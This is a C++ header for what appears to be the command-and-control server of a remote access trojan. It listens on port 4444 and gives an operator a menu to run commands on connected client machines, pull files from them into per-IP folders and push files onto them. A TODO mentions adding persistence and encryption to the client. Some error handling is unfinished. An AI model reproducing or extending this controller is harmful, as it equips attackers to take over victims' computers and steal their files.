#ifndef _SERVER_H_
#define _SERVER_H_

#include <fstream>
#include <boost/asio.hpp>
#include <memory>
#include <filesystem>
#include <iostream>
#include <stdlib.h>

// TODO - take this function to "common utils"
std::string EnvVariable(const std::string& envVariable)
{
    char* buf = nullptr;
    size_t sz = 0;
    return (_dupenv_s(&buf, &sz, envVariable.c_str()) == 0 && buf != nullptr) ? std::string(buf) : "Error";
}

// TODO - Add here and in the client Encrypt, Decrypt, Persistence... Move this to a "Globals" project. 
enum OperationType { RunCommand = 1, DownloadFile, UploadFile, Invalid };


class Session : public std::enable_shared_from_this<Session>
{
private:
    using TcpSocket = boost::asio::ip::tcp::socket;

public:
    Session(TcpSocket socket)
        : m_socket(std::move(socket))
    {
        CreateClientDedicatedDirectory();
    }

private:
    void CreateClientDedicatedDirectory()
    {
        std::string userHomeDirectory(EnvVariable("USERPROFILE"));
        std::string clientIp(m_socket.remote_endpoint().address().to_string());
        std::cout << "Connected to: " << clientIp << std::endl;
        m_clientDedicatedDirectory = (std::filesystem::path(userHomeDirectory) / "Downloads" / "Dst" / clientIp).string();
        std::filesystem::create_directory(m_clientDedicatedDirectory);
        std::filesystem::current_path(m_clientDedicatedDirectory);
        std::cout << "Created directory: " << m_clientDedicatedDirectory << std::endl;
    }

public:
    void start()
    {
        while (true)
        {
            switch (ReadOperationType())
            {
            case RunCommand:
                Command();
                break;
            case DownloadFile:
                Download();
                break;
            case UploadFile:
                Upload();
                break;
            default:
                std::cout << "Invalid operation! Type the number of a option from the menu!" << std::endl;
                break;
            }

        }
    }

    OperationType ReadOperationType()
    {
        PrintOptionsMenu();
        std::string operation;
        std::getline(std::cin >> std::ws, operation);

        return GetOperationType(operation);
    }

    void PrintOptionsMenu()
    {
        std::cout << "\n\n============  Choose an operation ============\n"
            << "1) Run command\n"
            << "2) Download file\n"
            << "3) Upload file\n"
            << "[+] Your choise - ";
    }

    OperationType GetOperationType(const std::string& operation)
    {
        std::unordered_map<std::string, OperationType> operations
        {
            {"1", RunCommand},
            {"2", DownloadFile},
            {"3", UploadFile}
        };

        if (!operations.count(operation))
            return Invalid;

        return operations[operation];
    }

    void Command()
    {
        auto command = ReadOperationInstruction("Write command");
        std::string request("1" + m_delimiter + command + m_delimiter);

        SendRequest(request);
        auto commandOutput = Response();
        std::cout << std::endl << commandOutput << std::endl;
    }

    std::string ReadOperationInstruction(const std::string& operation)
    {
        std::cout << "\n\n[+]" << operation << ": ";
        std::string instruction;
        std::getline(std::cin >> std::ws, instruction);
        RemoveUnnecessaryQuotationMark(instruction);
        return instruction;
    }

    void RemoveUnnecessaryQuotationMark(std::string& string)
    {
        if(string.front() == '\"' && string.back() == '\"')
            string = string.substr(1, string.length() - 2);
    }

    void SendRequest(const std::string& request)
    {
        auto buf = boost::asio::buffer(request);
        Send(buf);
    }

    std::string Response()
    {
        auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, m_delimiter, m_errorCode);
        if (m_errorCode)
            throw; // TODO - handle error

        return CleanReponse(responseSize);
    }

    std::string CleanReponse(size_t responseSize)
    {
        std::string response(
            buffers_begin(m_responseBuf.data()),
            buffers_begin(m_responseBuf.data()) + responseSize - m_delimiter.size()
        );
        m_responseBuf.consume(responseSize);

        return response;
    }

    void Download()
    {
        auto filePath = ReadOperationInstruction("Source path (remote)");
        auto fileToCreate = CreateFileLocally(filePath);
        auto request = "2" + m_delimiter + filePath + m_delimiter;
        SendRequest(request);

        auto fileSize = std::stoi(Response());
        while (fileSize > 0)
        {
            auto bufferSize = (fileSize < m_buf.size()) ? fileSize : m_buf.size();
            auto buf = boost::asio::buffer(m_buf, bufferSize);
            auto responseSize = boost::asio::read(m_socket, buf, m_errorCode);
            m_file.write(m_buf.data(), responseSize);

            fileSize -= responseSize;
            std::cout << "Remaining bytes: " << fileSize << "\nResponse Size: " << responseSize << std::endl;
        }
        std::cout << "Finished Download" << std::endl;
        m_file.close();
        std::cout << "File downloaded to - " << fileToCreate << std::endl;
    }

    void Upload()
    {
        auto localFilePath = ReadOperationInstruction("Source path (local)");
        auto destinationFilePath = ReadOperationInstruction("Destination path (remote)");
        auto fileSize = std::filesystem::file_size(localFilePath);
        auto request = "3" + m_delimiter + destinationFilePath + m_delimiter + std::to_string(fileSize) + m_delimiter;
        SendRequest(request);

        m_file.open(localFilePath, std::ios::in | std::ios::binary);
        if (!m_file)
            throw std::fstream::failure("Failed while opening file"); // TODO - Throw custom exception exception!

        while (fileSize > 0)
        {
            m_file.read(m_buf.data(), m_buf.size());
            if (m_file.fail() && !m_file.eof())
                throw std::fstream::failure("Failed while reading file");

            size_t bufferSize(m_file.gcount());
            auto buf = boost::asio::buffer(m_buf.data(), bufferSize);
            Send(buf);

            fileSize -= bufferSize;
        }
        m_file.close();
        std::cout << "File uploaded to - " << localFilePath << std::endl;
    }

    std::string CreateFileLocally(const std::string& filePath)
    {
        auto fileName = std::filesystem::path(filePath).filename().string();
        auto fileToCreate = (std::filesystem::path(m_clientDedicatedDirectory) / fileName).string();
        m_file.open(fileToCreate, std::ios::out | std::ios::binary);
        if (!m_file)
            throw; // TODO - throw specific exception

        return fileToCreate;
    }


private:
    // Move location and try to integrate with client as both have same function
    template<typename Buffer>
    void Send(Buffer& t_buffer)
    {
        boost::asio::write(m_socket, t_buffer, m_errorCode);
        if (m_errorCode)
            throw; // TODO - handle error (reset the connection & reset the m_errorCode to 0)
    }

    // Read until we meet "\n\n"
    void doRead()
    {
        auto self = shared_from_this(); // return another shared_pointer to the *this

        m_responseBuf.consume(m_responseBuf.size());
        auto responseSize = boost::asio::read_until(m_socket, m_responseBuf, "\n\n", m_errorCode);
        if (m_errorCode)
            throw; // TODO - handle error

        // We recive data from the socket, and read until "\n\n". Now m_requestBuf is suppose to hold the file name and size. 
        //async_read_until(m_socket, m_requestBuf, "\n\n",
        //    [this, self](boost::system::error_code ec, size_t bytes)
        //    {
        //        if (!ec)
        //        processRead(bytes);
        //        else
        //            handleError(__FUNCTION__, ec); // Maybe the error can be EOF ?
        //    });
    }

    void processRead(size_t t_bytesTransferred)
    {
        std::istream requestStream(&m_requestBuf);
        readData(requestStream); // Get the fileName and fileSize

        KeepOnlyFileName();
        createFile(); // Create the destination file

        // write extra bytes to file
        // Check what this does exactly
        do {
            requestStream.read(m_buf.data(), m_buf.size());
            m_file.write(m_buf.data(), requestStream.gcount()); // break point insdie the gcount(). Check its return value.
        } while (requestStream.gcount() > 0);


        auto self = shared_from_this();

        // Get the actual file bytes. 
        m_socket.async_read_some(boost::asio::buffer(m_buf.data(), m_buf.size()), // Get the first 40960 bytes.
            [this, self](boost::system::error_code ec, size_t bytes)
            {
                if (!ec)
                doReadFileContent(bytes);
                else
                    handleError(__FUNCTION__, ec);
            });
    }

    void readData(std::istream& stream)
    {
        stream >> m_fileName;
        stream >> m_fileSize;
        stream.read(m_buf.data(), 2); // Check exactly what is happening here. Is m_buf stores everything or just 2 characters. 
    }

    void KeepOnlyFileName()
    {
        auto pos = m_fileName.find_last_of('\\');
        if (pos != std::string::npos)
            m_fileName = m_fileName.substr(pos + 1);
    }

    void createFile()
    {
        m_file.open(m_fileName, std::ios_base::binary);
        if (!m_file) {
            return;
        }
    }

    void doReadFileContent(size_t t_bytesTransferred)
    {
        // If we recived more then 0 bytes, write them to the destination file. 
        if (t_bytesTransferred > 0) {
            m_file.write(m_buf.data(), static_cast<std::streamsize>(t_bytesTransferred));

            // If the bytes amount we allready got are equal to the m_fileSize we recived in Session::readData() , end the operation. 
            if (m_file.tellp() >= static_cast<std::streamsize>(m_fileSize)) {
                std::cout << "Received file: " << m_fileName << std::endl;
                Clean();
                return;
            }
        }
        auto self = shared_from_this();

        // Get the next 40960 bytes, and recursivly call the operation.
        // Try and convert to while loop and merge the Session::processRead() last part. 
        m_socket.async_read_some(boost::asio::buffer(m_buf.data(), m_buf.size()),
            [this, self](boost::system::error_code ec, size_t bytes)
            {
                doReadFileContent(bytes);
            });
    }

    void Clean()
    {
        m_file.clear();
        m_requestBuf.consume(m_requestBuf.size());
    }


    void handleError(std::string const& t_functionName, boost::system::error_code const& t_ec)
    {
        std::cerr << __FUNCTION__ << " in " << t_functionName << " due to "
            << t_ec << " " << t_ec.message() << std::endl;
    }

    TcpSocket m_socket;
    std::array<char, 1024> m_buf;
    boost::asio::streambuf m_requestBuf;
    boost::asio::streambuf m_responseBuf;
    std::fstream m_file;
    size_t m_fileSize;
    std::string m_fileName;
    std::string m_clientDedicatedDirectory; // Convert this to a map of IP-directoryPath so it could handle multiple clients
    boost::system::error_code m_errorCode;
    std::string m_delimiter = "\r\n\r\n";
};


class Server
{
private:
    using TcpSocket = boost::asio::ip::tcp::socket;
    using TcpAcceptor = boost::asio::ip::tcp::acceptor;
    using IoService = boost::asio::io_service;
public:

    Server(IoService& ioService)
        : m_socket(ioService), m_acceptor(ioService, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), 4444))
    {
        std::cout << "Server started" << std::endl;

        AcceptConnection();
    }

private:

    void AcceptConnection()
    {
        m_acceptor.async_accept(m_socket, [this](boost::system::error_code ec)
            {
                if (!ec)
                std::make_shared<Session>(std::move(m_socket))->start(); // Just calls Session::doRead()

        AcceptConnection();
            });
    }

    TcpSocket m_socket;
    TcpAcceptor m_acceptor;
};

#endif _SERVER_H_